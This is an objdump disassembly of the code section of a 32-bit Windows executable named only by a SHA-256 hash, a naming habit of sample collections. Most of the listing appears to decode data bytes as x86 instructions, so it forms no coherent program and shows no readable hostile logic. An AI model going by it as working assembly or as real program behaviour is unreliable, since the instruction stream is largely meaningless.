
b2a4ad4798937c89922dba29ceef46b62e6d220ceb847502402aa1da4ba0593f.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	cmp    BYTE PTR ds:0x0,0x0
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x23b400
  402013:	add    BYTE PTR [eax+ebx*1+0x0],ah
  402017:	add    BYTE PTR [ebx],cl
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [ecx],al
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax+0x0],al
	...
  40204d:	add    BYTE PTR [eax],al
  40204f:	add    dh,cl
  402051:	jno    0x40208f
  402053:	dec    ebp
  402054:	push   cs
  402055:	mov    ?,WORD PTR [ecx-0x31961238]
  40205b:	xor    al,0xd7
  40205d:	sar    BYTE PTR [edx+0x639432fb],1
  402063:	adc    BYTE PTR ds:0x70ae8042,bh
  402069:	mov    al,BYTE PTR [ecx+ebx*1+0x30]
  40206d:	pop    eax
  40206e:	das    
  40206f:	lods   al,BYTE PTR ds:[esi]
  402070:	add    ecx,DWORD PTR [edi+0x22fba0ff]
  402076:	push   edi
  402077:	sub    DWORD PTR [ecx+eiz*2-0x3c],0x4f3ef060
  40207f:	gs push ds
  402081:	js     0x4020df
  402083:	mov    dl,0xd2
  402085:	fiadd  WORD PTR [ebp+0x29]
  402088:	cmp    eax,DWORD PTR [edi+eiz*4+0x5f76246]
  40208f:	jne    0x4020af
  402091:	mov    ebx,0xb89bf84b
  402096:	pop    ebp
  402097:	add    DWORD PTR [edi],edi
  402099:	pop    edx
  40209a:	lahf   
  40209b:	cmp    BYTE PTR fs:[edx-0x68],ah
  40209f:	mov    ebp,0xc3f6bfd
  4020a4:	adc    dl,BYTE PTR [esi]
  4020a6:	add    edx,DWORD PTR [esi+eax*4+0x11]
  4020aa:	pushf  
  4020ab:	add    eax,0x6dac44ae
  4020b0:	push   ebp
  4020b1:	mov    esi,0xce80803b
  4020b6:	sbb    BYTE PTR [edx],ch
  4020b8:	fstp   TBYTE PTR [esi+0x20aee01a]
  4020be:	and    edi,DWORD PTR [ecx+0x1c]
  4020c1:	push   edx
  4020c2:	pop    ss
  4020c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020c4:	icebp  
  4020c5:	add    eax,0x92bfed24
  4020ca:	push   ss
  4020cb:	push   cs
  4020cc:	inc    edx
  4020cd:	pop    esp
  4020ce:	not    BYTE PTR [ebp+0x32]
  4020d1:	jae    0x4020d8
  4020d3:	add    BYTE PTR [eax],al
  4020d5:	push   es
  4020d6:	add    ch,BYTE PTR [eax]
  4020d8:	add    al,BYTE PTR [eax]
  4020da:	add    BYTE PTR [esi],al
  4020dc:	sub    al,BYTE PTR [eax]
  4020de:	add    BYTE PTR [eax],al
  4020e0:	adc    esi,DWORD PTR [eax]
  4020e2:	add    al,BYTE PTR [eax]
  4020e4:	add    BYTE PTR es:[eax],al
  4020e7:	add    BYTE PTR [ecx],al
  4020e9:	add    BYTE PTR [eax],al
  4020eb:	adc    DWORD PTR [edx],eax
  4020ed:	jae    0x4020f5
  4020ef:	add    BYTE PTR [eax],al
  4020f1:	push   es
  4020f2:	sub    BYTE PTR [edi],cl
  4020f4:	add    BYTE PTR [eax],al
  4020f6:	or     al,BYTE PTR [edx]
  4020f8:	inc    BYTE PTR [esi]
  4020fa:	add    eax,DWORD PTR [eax]
  4020fc:	add    BYTE PTR [esi],al
  4020fe:	jae    0x402110
  402100:	add    BYTE PTR [eax],al
  402102:	or     ch,BYTE PTR [eax]
  402104:	adc    DWORD PTR [eax],eax
  402106:	add    BYTE PTR [edx],cl
  402108:	or     al,BYTE PTR [esi]
  40210a:	add    ebp,DWORD PTR [edi+0x12]
  40210d:	add    BYTE PTR [eax],al
  40210f:	or     dl,BYTE PTR [esi]
  402111:	sub    al,BYTE PTR [eax]
  402113:	add    BYTE PTR [ebx],dl
  402115:	xor    BYTE PTR [ebx],al
  402117:	add    BYTE PTR ds:0x2000001,al
  40211d:	add    BYTE PTR [eax],al
  40211f:	adc    DWORD PTR [eax],ebp
  402121:	or     BYTE PTR [eax],al
  402123:	add    BYTE PTR [esi],al
  402125:	jle    0x40213a
  402127:	add    BYTE PTR [eax],al
  402129:	or     al,BYTE PTR [eax+0xa000014]
  40212f:	adc    al,0xa
  402131:	adc    al,0xb
  402133:	adc    al,0xc
  402135:	add    esi,DWORD PTR [ecx+eax*1+0x0]
  402139:	add    BYTE PTR [ebx],bl
  40213b:	adc    ecx,DWORD PTR [eax]
  40213d:	push   ss
  40213e:	adc    ecx,DWORD PTR [ecx]
  402140:	sub    esp,DWORD PTR [ecx+0x11]
  402143:	or     BYTE PTR [ecx],dl
  402145:	or     DWORD PTR [edx+0x172090d],ebx
  40214b:	add    BYTE PTR [eax],al
  40214d:	jo     0x402177
  40214f:	adc    eax,0x2d0a0000
  402154:	or     BYTE PTR [eax],ch
  402156:	push   ss
  402157:	add    BYTE PTR [eax],al
  402159:	or     ah,BYTE PTR [esi]
  40215b:	sub    eax,DWORD PTR [eax+0x6]
  40215e:	sub    eax,0x2b0a0904
  402163:	cmp    DWORD PTR [edi],eax
  402165:	sub    eax,0x2b0b0904
  40216a:	xor    cl,BYTE PTR [eax]
  40216c:	sub    eax,0x2b0c0904
  402171:	sub    eax,DWORD PTR [edx]
  402173:	jl     0x402177
  402175:	add    BYTE PTR [eax],al
  402177:	add    al,0x28
  402179:	pop    ss
  40217a:	add    BYTE PTR [eax],al
  40217c:	or     ch,BYTE PTR ds:0x28090218
  402182:	sbb    BYTE PTR [eax],al
  402184:	add    BYTE PTR [edx],cl
  402186:	sub    BYTE PTR [ecx],bl
  402188:	add    BYTE PTR [eax],al
  40218a:	or     dh,BYTE PTR [ebx+0x1a]
  40218d:	add    BYTE PTR [eax],al
  40218f:	or     bh,BYTE PTR [ebp+0x2]
  402192:	add    BYTE PTR [eax],al
  402194:	add    al,0x2b
  402196:	push   es
  402197:	jae    0x4021b4
  402199:	add    BYTE PTR [eax],al
  40219b:	or     bh,BYTE PTR [edx+0x11]
  40219e:	or     DWORD PTR [edi],edx
  4021a0:	pop    eax
  4021a1:	adc    ecx,DWORD PTR [ecx]
  4021a3:	adc    DWORD PTR [ecx],ecx
  4021a5:	adc    DWORD PTR [eax],ecx
  4021a7:	mov    gs,WORD PTR [ecx+0x32]
  4021aa:	xchg   edi,eax
  4021ab:	push   es
  4021ac:	sub    al,0x13
  4021ae:	pop    es
  4021af:	sub    al,0x10
  4021b1:	or     BYTE PTR [ecx*1+0x27c02],ch
  4021b8:	add    BYTE PTR [eax+ebp*1],al
  4021bb:	pop    ss
  4021bc:	add    BYTE PTR [eax],al
  4021be:	or     ch,BYTE PTR ds:0x1b7306
  4021c4:	add    BYTE PTR [edx],cl
  4021c6:	jp     0x4021df
  4021c8:	push   es
  4021c9:	jae    0x4021e7
  4021cb:	add    BYTE PTR [eax],al
  4021cd:	or     dl,BYTE PTR [ebx]
  4021cf:	add    al,0x18
  4021d1:	pop    es
  4021d2:	jae    0x4021f0
  4021d4:	add    BYTE PTR [eax],al
  4021d6:	or     dl,BYTE PTR [ebx]
  4021d8:	add    eax,0x1d2806
  4021dd:	add    BYTE PTR [edx],cl
  4021df:	add    bh,dh
  4021e1:	push   es
  4021e2:	add    al,0x0
  4021e4:	add    BYTE PTR [esi],al
  4021e6:	jae    0x4021f8
  4021e8:	add    BYTE PTR [eax],al
  4021ea:	or     ch,BYTE PTR [eax]
  4021ec:	adc    DWORD PTR [eax],eax
  4021ee:	add    BYTE PTR [edx],cl
  4021f0:	jae    0x402210
  4021f2:	add    BYTE PTR [eax],al
  4021f4:	or     dl,BYTE PTR [ebx]
  4021f6:	push   es
  4021f7:	adc    DWORD PTR [esi],eax
  4021f9:	pop    ss
  4021fa:	outs   dx,DWORD PTR ds:[esi]
  4021fb:	pop    ds
  4021fc:	add    BYTE PTR [eax],al
  4021fe:	or     dl,BYTE PTR [ecx]
  402200:	push   es
  402201:	or     BYTE PTR [edi+0x20],ch
  402204:	add    BYTE PTR [eax],al
  402206:	or     al,BYTE PTR [edx]
  402208:	jl     0x40220c
  40220a:	add    BYTE PTR [eax],al
  40220c:	add    al,0x28
  40220e:	and    DWORD PTR [eax],eax
  402210:	add    BYTE PTR [edx],cl
  402212:	adc    DWORD PTR [ecx+edx*1],eax
  402215:	add    eax,0x2273
  40221a:	or     dl,BYTE PTR [ebx]
  40221c:	pop    es
  40221d:	adc    DWORD PTR [edi],eax
  40221f:	outs   dx,DWORD PTR ds:[esi]
  402220:	and    eax,DWORD PTR [eax]
  402222:	add    BYTE PTR [edx],cl
  402224:	sub    al,BYTE PTR [eax]
  402226:	add    BYTE PTR [eax],al
  402228:	adc    esi,DWORD PTR [eax]
  40222a:	add    al,BYTE PTR [eax]
  40222c:	inc    ebx
  40222d:	add    BYTE PTR [eax],al
  40222f:	add    BYTE PTR [ebx],al
  402231:	add    BYTE PTR [eax],al
  402233:	adc    DWORD PTR [ebx],eax
  402235:	je     0x402252
  402237:	add    BYTE PTR [eax],al
  402239:	add    DWORD PTR [edx],ecx
  40223b:	push   es
  40223c:	sub    BYTE PTR [eax+eax*1],ah
  40223f:	add    BYTE PTR [edx],cl
  402241:	or     ebp,DWORD PTR [ebx]
  402243:	movaps xmm4,XMMWORD PTR ds:0x7e0a0000
  40224a:	adc    al,0x0
  40224c:	add    BYTE PTR [edx],cl
  40224e:	outs   dx,DWORD PTR ds:[esi]
  40224f:	add    BYTE PTR es:[eax],al
  402252:	or     al,BYTE PTR [edi]
  402254:	and    al,ch
  402256:	add    eax,DWORD PTR [eax]
  402258:	add    BYTE PTR [edi+0x27],ch
  40225b:	add    BYTE PTR [eax],al
  40225d:	or     ch,BYTE PTR [esp+eiz*8]
  402260:	pop    es
  402261:	outs   dx,DWORD PTR ds:[esi]
  402262:	sub    BYTE PTR [eax],al
  402264:	add    BYTE PTR [edx],cl
  402266:	pop    es
  402267:	outs   dx,DWORD PTR ds:[esi]
  402268:	sub    DWORD PTR [eax],eax
  40226a:	add    BYTE PTR [edx],cl
  40226c:	and    BYTE PTR [ecx],al
  40226e:	add    BYTE PTR [ecx],ah
  402270:	in     al,0x28
  402272:	sub    al,BYTE PTR [eax]
  402274:	add    BYTE PTR [edx],cl
  402276:	sub    bl,BYTE PTR [esi]
  402278:	add    ch,BYTE PTR [eax]
  40227a:	sub    eax,DWORD PTR [eax]
  40227c:	add    BYTE PTR [edx],cl
  40227e:	sub    bh,BYTE PTR [edx]
  402280:	add    ch,BYTE PTR [eax]
  402282:	sub    eax,DWORD PTR [eax]
  402284:	add    BYTE PTR [edx],cl
  402286:	add    al,BYTE PTR [ebx]
  402288:	jge    0x40228d
  40228a:	add    BYTE PTR [eax],al
  40228c:	add    al,0x2a
  40228e:	add    BYTE PTR [eax],al
  402290:	sbb    esi,DWORD PTR [eax]
  402292:	add    eax,DWORD PTR [eax]
  402294:	popf   
  402295:	add    BYTE PTR [eax],al
  402297:	add    BYTE PTR [eax+eax*1],al
  40229a:	add    BYTE PTR [ecx],dl
  40229c:	and    BYTE PTR ds:0xa800040,al
  4022a2:	add    esi,DWORD PTR [ebp+0x2a]
  4022a5:	add    BYTE PTR [eax],al
  4022a7:	add    DWORD PTR [eax+ecx*1],ebp
  4022aa:	and    BYTE PTR [esi],cl
  4022ac:	add    BYTE PTR [edi],al
  4022ae:	or     BYTE PTR [edx],0x2b
  4022b1:	pop    esi
  4022b2:	add    esi,DWORD PTR [ebx+0x2c]
  4022b5:	add    BYTE PTR [eax],al
  4022b7:	or     ch,BYTE PTR [eax]
  4022b9:	sub    eax,0xa0a0000
  4022be:	jb     0x4022cf
  4022c0:	add    BYTE PTR [eax],al
  4022c2:	jo     0x4022d8
  4022c4:	push   ds
  4022c5:	sub    BYTE PTR [esi],ch
  4022c7:	add    BYTE PTR [eax],al
  4022c9:	or     cl,BYTE PTR [ebx]
  4022cb:	add    bh,BYTE PTR [ebx+0x3]
  4022ce:	add    BYTE PTR [eax],al
  4022d0:	add    al,0x7c
  4022d2:	add    al,BYTE PTR [eax]
  4022d4:	add    BYTE PTR [eax+ebp*1],al
  4022d7:	pop    ss
  4022d8:	add    BYTE PTR [eax],al
  4022da:	or     ch,BYTE PTR [eax+eiz*1]
  4022dd:	pop    es
  4022de:	jb     0x402261
  4022e0:	add    BYTE PTR [eax],al
  4022e2:	jo     0x4022e6
  4022e4:	jnp    0x4022e9
  4022e6:	add    BYTE PTR [eax],al
  4022e8:	add    al,0x7c
  4022ea:	add    al,BYTE PTR [eax]
  4022ec:	add    BYTE PTR [eax+ebp*1],al
  4022ef:	and    DWORD PTR [eax],eax
  4022f1:	add    BYTE PTR [edx],cl
  4022f3:	mov    WORD PTR ds:0x6f010000,ds
  4022f9:	das    
  4022fa:	add    BYTE PTR [eax],al
  4022fc:	or     al,BYTE PTR [edi]
  4022fe:	add    ebp,DWORD PTR [edi+0x30]
  402301:	add    BYTE PTR [eax],al
  402303:	or     bl,dh
  402305:	or     al,BYTE PTR [edi]
  402307:	sub    al,0x6
  402309:	pop    es
  40230a:	outs   dx,DWORD PTR ds:[esi]
  40230b:	xor    DWORD PTR [eax],eax
  40230d:	add    BYTE PTR [edx],cl
  40230f:	fdivr  QWORD PTR [esi+0x14]
  402312:	add    BYTE PTR [eax],al
  402314:	or     ch,BYTE PTR [edi+0x26]
  402317:	add    BYTE PTR [eax],al
  402319:	or     bh,BYTE PTR [esi+0x14]
  40231c:	add    BYTE PTR [eax],al
  40231e:	or     ch,BYTE PTR [edi+0x32]
  402321:	add    BYTE PTR [eax],al
  402323:	or     ch,BYTE PTR [eax]
  402325:	and    eax,0x280a0000
  40232a:	xor    eax,DWORD PTR [eax]
  40232c:	add    BYTE PTR [edx],cl
  40232e:	fiadd  WORD PTR [edi]
  402330:	push   es
  402331:	sub    BYTE PTR [edx],ch
  402333:	add    BYTE PTR [eax],al
  402335:	or     bl,ah
  402337:	push   ss
  402338:	sub    al,BYTE PTR [eax]
  40233a:	add    BYTE PTR [eax],al
  40233c:	add    DWORD PTR [eax+eax*1],ebx
  40233f:	add    BYTE PTR [edx],al
  402341:	add    BYTE PTR [edi],ch
  402343:	add    BYTE PTR [ebx],bh
  402345:	push   0x0
  402347:	or     al,BYTE PTR [eax]
  402349:	add    BYTE PTR [eax],al
  40234b:	add    BYTE PTR [edx],al
  40234d:	add    BYTE PTR [esi],al
  40234f:	add    BYTE PTR [esi+0x70094],cl
  402355:	add    BYTE PTR [eax],al
  402357:	add    BYTE PTR [ebx],dl
  402359:	xor    BYTE PTR [ecx],al
  40235b:	add    BYTE PTR [ecx],bl
  40235d:	add    BYTE PTR [eax],al
  40235f:	add    BYTE PTR ds:0x7e110000,al
  402365:	xor    al,0x0
  402367:	add    BYTE PTR [edx],cl
  402369:	sub    BYTE PTR ds:0x2d0a0000,dh
  40236f:	add    ebx,DWORD PTR [eax]
  402371:	sub    eax,DWORD PTR [edx]
  402373:	pop    ds
  402374:	and    BYTE PTR [edx],cl
  402376:	push   es
  402377:	sub    BYTE PTR [ecx],cl
  402379:	add    BYTE PTR [eax],al
  40237b:	push   es
  40237c:	sub    al,BYTE PTR [eax]
  40237e:	add    BYTE PTR [eax],al
  402380:	adc    esi,DWORD PTR [eax]
  402382:	add    eax,DWORD PTR [eax]
  402384:	sub    BYTE PTR [eax],al
  402386:	add    BYTE PTR [eax],al
  402388:	push   es
  402389:	add    BYTE PTR [eax],al
  40238b:	adc    DWORD PTR [edx-0x67],esi
  40238e:	add    BYTE PTR [eax],al
  402390:	jo     0x402404
  402392:	stos   DWORD PTR es:[edi],eax
  402393:	add    BYTE PTR [eax],al
  402395:	jo     0x402409
  402397:	mov    ebp,0x73700000
  40239c:	cmp    BYTE PTR [eax],al
  40239e:	add    BYTE PTR [edx],cl
  4023a0:	sub    BYTE PTR [ecx],bh
  4023a2:	add    BYTE PTR [eax],al
  4023a4:	or     cl,BYTE PTR [edx]
  4023a6:	adc    al,BYTE PTR [eax]
  4023a8:	jb     0x402373
  4023aa:	add    BYTE PTR [eax],al
  4023ac:	jo     0x4023b0
  4023ae:	sub    BYTE PTR [edx],bh
  4023b0:	add    BYTE PTR [eax],al
  4023b2:	or     ch,BYTE PTR [edx]
  4023b4:	inc    edx
  4023b5:	push   ebx
  4023b6:	dec    edx
  4023b7:	inc    edx
  4023b8:	add    DWORD PTR [eax],eax
  4023ba:	add    DWORD PTR [eax],eax
  4023bc:	add    BYTE PTR [eax],al
  4023be:	add    BYTE PTR [eax],al
  4023c0:	or     al,0x0
  4023c2:	add    BYTE PTR [eax],al
  4023c4:	jbe    0x4023f8
  4023c6:	xor    BYTE PTR cs:[esi],ch
  4023c9:	xor    eax,0x37323730
  4023ce:	add    BYTE PTR [eax],al
  4023d0:	add    BYTE PTR [eax],al
  4023d2:	add    eax,0x6c00
  4023d7:	add    BYTE PTR [eax+0x23000005],ah
  4023dd:	jle    0x4023df
  4023df:	add    BYTE PTR [esi+eax*1],cl
  4023e2:	add    BYTE PTR [eax],al
  4023e4:	dec    esp
  4023e5:	or     BYTE PTR [eax],al
  4023e7:	add    BYTE PTR [ebx],ah
  4023e9:	push   ebx
  4023ea:	je     0x40245e
  4023ec:	imul   ebp,DWORD PTR [esi+0x67],0x73
  4023f3:	add    BYTE PTR [eax+0xe],bl
  4023f6:	add    BYTE PTR [eax],al
  4023f8:	rol    BYTE PTR [eax],1
  4023fa:	add    BYTE PTR [eax],al
  4023fc:	and    edx,DWORD PTR [ebp+0x53]
  4023ff:	add    BYTE PTR [eax],ch
  402401:	sldt   WORD PTR [eax]
  402404:	adc    BYTE PTR [eax],al
  402406:	add    BYTE PTR [eax],al
  402408:	and    eax,DWORD PTR [edi+0x55]
  40240b:	dec    ecx
  40240c:	inc    esp
  40240d:	add    BYTE PTR [eax],al
  40240f:	add    BYTE PTR [eax],bh
  402411:	sldt   WORD PTR [eax]
  402414:	sub    al,0x9
  402416:	add    BYTE PTR [eax],al
  402418:	and    eax,DWORD PTR [edx+0x6c]
  40241b:	outs   dx,DWORD PTR ds:[esi]
  40241c:	bound  eax,QWORD PTR [eax]
  40241e:	add    BYTE PTR [eax],al
  402420:	add    BYTE PTR [eax],al
  402422:	add    BYTE PTR [eax],al
  402424:	add    al,BYTE PTR [eax]
  402426:	add    BYTE PTR [ecx],al
  402428:	push   edi
  402429:	pop    ds
  40242a:	add    bl,BYTE PTR [ecx+ecx*1]
  40242d:	add    al,BYTE PTR [eax]
  40242f:	add    BYTE PTR [eax],al
  402431:	cli    
  402432:	and    eax,0x160033
  402437:	add    BYTE PTR [ecx],al
  402439:	add    BYTE PTR [eax],al
  40243b:	add    BYTE PTR [eax+eax*1],dh
  40243e:	add    BYTE PTR [eax],al
  402440:	or     DWORD PTR [eax],eax
  402442:	add    BYTE PTR [eax],al
  402444:	or     eax,0xa000000
  402449:	add    BYTE PTR [eax],al
  40244b:	add    BYTE PTR [eax],cl
  40244d:	add    BYTE PTR [eax],al
  40244f:	add    BYTE PTR [ecx],al
  402451:	add    BYTE PTR [eax],al
  402453:	add    BYTE PTR [edx],bh
  402455:	add    BYTE PTR [eax],al
  402457:	add    BYTE PTR [edx],cl
  402459:	add    BYTE PTR [eax],al
  40245b:	add    BYTE PTR ds:0x6000000,cl
  402461:	add    BYTE PTR [eax],al
  402463:	add    BYTE PTR [ecx],al
  402465:	add    BYTE PTR [eax],al
  402467:	add    BYTE PTR [edx],al
  402469:	add    BYTE PTR [eax],al
  40246b:	add    BYTE PTR [ecx],al
  40246d:	add    BYTE PTR [eax],al
  40246f:	add    BYTE PTR [ecx],al
  402471:	add    BYTE PTR [eax],al
  402473:	add    BYTE PTR [eax+eax*1],al
  402476:	add    BYTE PTR [eax],al
  402478:	add    eax,DWORD PTR [eax]
  40247a:	add    BYTE PTR [eax],al
  40247c:	add    BYTE PTR [eax],al
  40247e:	or     al,BYTE PTR [eax]
  402480:	add    DWORD PTR [eax],eax
  402482:	add    BYTE PTR [eax],al
  402484:	add    BYTE PTR [eax],al
  402486:	push   es
  402487:	add    dh,bl
  402489:	add    bh,dl
  40248b:	add    BYTE PTR [edx],cl
  40248d:	add    BYTE PTR [ecx],ah
  40248f:	add    esp,edi
  402491:	add    BYTE PTR [esi],al
  402493:	add    BYTE PTR [ecx+eax*1],dh
  402496:	xlat   BYTE PTR ds:[ebx]
  402497:	add    BYTE PTR [esi],al
  402499:	add    BYTE PTR [ecx+0x1],cl
  40249c:	xlat   BYTE PTR ds:[ebx]
  40249d:	add    BYTE PTR [esi],al
  40249f:	add    BYTE PTR [ebp+0x600d701],bl
  4024a5:	add    BYTE PTR [esi+0x2],ah
  4024a8:	push   ecx
  4024a9:	add    al,BYTE PTR [esi]
  4024ab:	add    BYTE PTR [esi+0x602a402],dh
  4024b1:	add    bh,cl
  4024b3:	add    ah,BYTE PTR [edx+eax*1+0x2ec0006]
  4024ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024bb:	add    al,BYTE PTR [esi]
  4024bd:	add    BYTE PTR [edx],dl
  4024bf:	add    esp,DWORD PTR [edx+eax*1+0x32b0006]
  4024c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024c7:	add    al,BYTE PTR [esi]
  4024c9:	add    BYTE PTR [esi+0x3],al
  4024cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024cd:	add    al,BYTE PTR [esi]
  4024cf:	add    BYTE PTR [ecx+0x3],ah
  4024d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024d3:	add    al,BYTE PTR [esi]
  4024d5:	add    BYTE PTR [edx+0x3],bh
  4024d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024d9:	add    al,BYTE PTR [esi]
  4024db:	add    BYTE PTR [ebx+eax*1+0x60393],ah
  4024e2:	mov    BYTE PTR [ebx],0xa4
  4024e5:	add    al,BYTE PTR [esi]
  4024e7:	add    al,dh
  4024e9:	add    ebx,ebp
  4024eb:	add    eax,DWORD PTR [edi+0x0]
  4024ee:	add    al,0x4
  4024f0:	add    BYTE PTR [eax],al
  4024f2:	push   es
  4024f3:	add    BYTE PTR [ebx],dh
  4024f5:	add    al,0x13
  4024f7:	add    al,0x6
  4024f9:	add    BYTE PTR [ebx+0x4],dl
  4024fc:	adc    eax,DWORD PTR [esi+eax*1]
  4024ff:	add    BYTE PTR [ecx+0x4],dh
  402502:	xlat   BYTE PTR ds:[ebx]
  402503:	add    BYTE PTR [edx],cl
  402505:	add    BYTE PTR [edi+0x6048404],bl
  40250b:	add    al,dl
  40250d:	add    al,0xbf
  40250f:	add    al,0xa
  402511:	add    BYTE PTR [ebx],bl
  402513:	add    eax,0xa0502
  402518:	xor    eax,DWORD PTR ds:0xa00fc
  40251e:	outs   dx,BYTE PTR ds:[esi]
  40251f:	add    eax,0x60544
  402524:	xchg   BYTE PTR ds:0x600d7,al
  40252a:	pushf  
  40252b:	add    eax,0x603dd
  402530:	into   
  402531:	add    eax,0x600d7
  402536:	aam    0x5
  402538:	xlat   BYTE PTR ds:[ebx]
  402539:	add    BYTE PTR [esi],al
  40253b:	add    dl,ch
  40253d:	add    eax,0xe00d7
  402542:	and    BYTE PTR [esi],al
  402544:	adc    BYTE PTR [esi],al
  402546:	push   cs
  402547:	add    BYTE PTR [edx],bh
  402549:	push   es
  40254a:	adc    BYTE PTR [esi],al
  40254c:	or     al,BYTE PTR [eax]
  40254e:	dec    eax
  40254f:	push   es
  402550:	test   BYTE PTR [esi+eax*1],al
  402553:	add    BYTE PTR [ebp+0x6],ah
  402556:	mov    edi,0x8d000a04
  40255b:	push   es
  40255c:	test   BYTE PTR [esi+eax*1],al
  40255f:	add    BYTE PTR [esi+0x6069c06],ah
  402565:	add    BYTE PTR [ebp+0x1204bf06],ch
  40256b:	add    al,al
  40256d:	push   es
  40256e:	fld    QWORD PTR [ebx]
  402570:	push   es
  402571:	add    ah,cl
  402573:	push   es
  402574:	mov    edi,0xf2000604
  402579:	push   es
  40257a:	xlat   BYTE PTR ds:[ebx]
  40257b:	add    BYTE PTR [esi],al
  40257d:	add    BYTE PTR [ebx],al
  40257f:	pop    es
  402580:	xlat   BYTE PTR ds:[ebx]
  402581:	add    BYTE PTR [esi],al
  402583:	add    BYTE PTR [edi],dh
  402585:	pop    es
  402586:	sbb    BYTE PTR [edi],al
  402588:	or     al,BYTE PTR [eax]
  40258a:	push   edx
  40258b:	pop    es
  40258c:	inc    esp
  40258d:	add    eax,0x77f000a
  402592:	pop    ebp
  402593:	pop    es
  402594:	adc    al,BYTE PTR [eax]
  402596:	mov    eax,DWORD PTR [edi]
  402598:	fld    QWORD PTR [ebx]
  40259a:	push   es
  40259b:	add    BYTE PTR [edx+0xa00d707],ch
  4025a1:	add    dh,dl
  4025a3:	pop    es
  4025a4:	mov    esi,0xe5000607
  4025a9:	pop    es
  4025aa:	xlat   BYTE PTR ds:[ebx]
  4025ab:	add    BYTE PTR [esi],al
  4025ad:	add    BYTE PTR [eax],al
  4025af:	or     bh,dl
  4025b1:	add    BYTE PTR [esi],al
  4025b3:	add    BYTE PTR [edi],cl
  4025b5:	or     BYTE PTR [eax],bl
  4025b7:	pop    es
  4025b8:	push   es
  4025b9:	add    BYTE PTR [edi],ch
  4025bb:	or     bh,dl
  4025bd:	add    BYTE PTR [eax],al
  4025bf:	add    BYTE PTR [eax],al
  4025c1:	add    BYTE PTR [ecx],al
  4025c3:	add    BYTE PTR [eax],al
  4025c5:	add    BYTE PTR [eax],al
  4025c7:	add    BYTE PTR [ecx],al
  4025c9:	add    BYTE PTR [ecx],al
  4025cb:	add    BYTE PTR [eax+0x29001001],al
  4025d1:	add    BYTE PTR [ebx],dh
  4025d3:	add    BYTE PTR ds:0x1000100,al
  4025d9:	add    BYTE PTR [eax],al
  4025db:	add    BYTE PTR [eax],dl
  4025dd:	add    BYTE PTR [esi+0x0],cl
  4025e0:	xor    eax,DWORD PTR [eax]
  4025e2:	add    eax,0x1000200
  4025e7:	add    BYTE PTR [ebx],al
  4025e9:	add    DWORD PTR [eax],edx
  4025eb:	add    BYTE PTR [esi+0x0],ah
  4025ee:	add    BYTE PTR [eax],al
  4025f0:	add    eax,0x6000300
  4025f5:	add    BYTE PTR [eax+0x77001001],al
  4025fb:	add    BYTE PTR [ebx],dh
  4025fd:	add    BYTE PTR ds:0x8000400,al
  402603:	add    BYTE PTR [ebx],al
  402605:	add    DWORD PTR [eax],eax
  402607:	add    BYTE PTR [ebp+0xd000000],cl
  40260d:	add    BYTE PTR [eax+eax*1],al
  402610:	or     DWORD PTR [eax],eax
  402612:	add    DWORD PTR [ecx],0x10
  402615:	add    BYTE PTR [eax+0x5000000],ch
  40261b:	add    BYTE PTR [eax+eax*1],cl
  40261e:	or     DWORD PTR [eax],eax
  402620:	add    BYTE PTR [ecx],0x10
  402623:	add    BYTE PTR [esi+0x5000000],dh
  402629:	add    BYTE PTR [eax+eax*1],cl
  40262c:	or     al,BYTE PTR [eax]
  40262e:	add    BYTE PTR [ecx],0x10
  402631:	add    dl,al
  402633:	add    BYTE PTR [eax],al
  402635:	add    BYTE PTR ds:0xa000e00,al
  40263b:	add    BYTE PTR [esi-0x80],dl
  40263e:	cmp    DWORD PTR [ecx],eax
  402640:	adc    eax,DWORD PTR [eax]
  402642:	add    DWORD PTR [eax],eax
  402644:	push   esp
  402645:	add    DWORD PTR [ecx+0x0],esp
  402648:	and    DWORD PTR [eax],eax
  40264a:	pop    DWORD PTR [ecx]
  40264c:	jge    0x40264e
  40264e:	push   es
  40264f:	push   es
  402650:	int    0x1
  402652:	xchg   ecx,eax
  402653:	add    BYTE PTR [esi-0x80],dl
  402656:	aad    0x1
  402658:	xchg   esp,eax
  402659:	add    BYTE PTR [esi-0x80],dl
  40265c:	fiadd  DWORD PTR [ecx]
  40265e:	xchg   esp,eax
  40265f:	add    BYTE PTR [esi-0x80],dl
  402662:	loope  0x402665
  402664:	xchg   esp,eax
  402665:	add    BYTE PTR [esi-0x80],dl
  402668:	out    0x1,eax
  40266a:	xchg   esp,eax
  40266b:	add    BYTE PTR [esi-0x80],dl
  40266e:	inc    DWORD PTR [ecx]
  402670:	xchg   esp,eax
  402671:	add    BYTE PTR [esi-0x80],dl
  402674:	or     eax,DWORD PTR [edx]
  402676:	xchg   esp,eax
  402677:	add    BYTE PTR [esi-0x80],dl
  40267a:	sbb    BYTE PTR [edx],al
  40267c:	xchg   esp,eax
  40267d:	add    BYTE PTR [ebx-0x80],dl
  402680:	xor    al,BYTE PTR [edx]
  402682:	adc    eax,DWORD PTR [eax]
  402684:	push   ebx
  402685:	add    BYTE PTR [ebx+0x2],0x13
  402689:	add    al,dl
  40268b:	and    BYTE PTR [eax],al
  40268d:	add    BYTE PTR [eax],al
  40268f:	add    BYTE PTR [ecx+0x68016000],dl
  402695:	add    BYTE PTR [ecx],al
  402697:	add    al,ah
  402699:	and    BYTE PTR [eax],al
  40269b:	add    BYTE PTR [eax],al
  40269d:	add    BYTE PTR [ecx+0x6e016500],al
  4026a3:	add    BYTE PTR [edx],al
  4026a5:	add    BYTE PTR [ecx+eiz*1],dl
  4026a8:	add    BYTE PTR [eax],al
  4026aa:	add    BYTE PTR [eax],al
  4026ac:	add    DWORD PTR [eax],0x74016d
  4026b2:	add    eax,DWORD PTR [eax]
  4026b4:	sub    BYTE PTR [edx],ah
  4026b6:	add    BYTE PTR [eax],al
  4026b8:	add    BYTE PTR [eax],al
  4026ba:	add    DWORD PTR [eax],0x740171
